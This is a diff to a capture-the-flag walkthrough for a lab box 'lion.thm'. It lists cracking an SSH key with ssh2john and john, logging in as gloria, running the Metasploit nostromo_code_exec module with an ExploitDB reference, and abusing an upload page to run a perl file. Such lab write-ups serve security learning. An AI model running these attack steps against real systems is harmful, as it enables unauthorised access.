@@ -5,6 +5,9 @@
 5. `ssh2john id_rsa > for_john&&john for_john --wordlist=/usr/share/wordlists/rockyou.txt`
 6. `ssh -i id_rsa gloria@lion.thm`
 ## Method 2
+### ExploitDB
+1. https://www.exploit-db.com/exploits/47837
+### Msfconsole
 1. `use exploit/multi/http/nostromo_code_exec`
 2. `set rport 8080`
 3. `set rhost lion.thm`
@@ -13,6 +16,7 @@
 6. `exploit`
 ## Method 3
 1. http://lion.thm/upload/
+2. Executes `perl` file
 
 
 ## Privilage Esc. 1
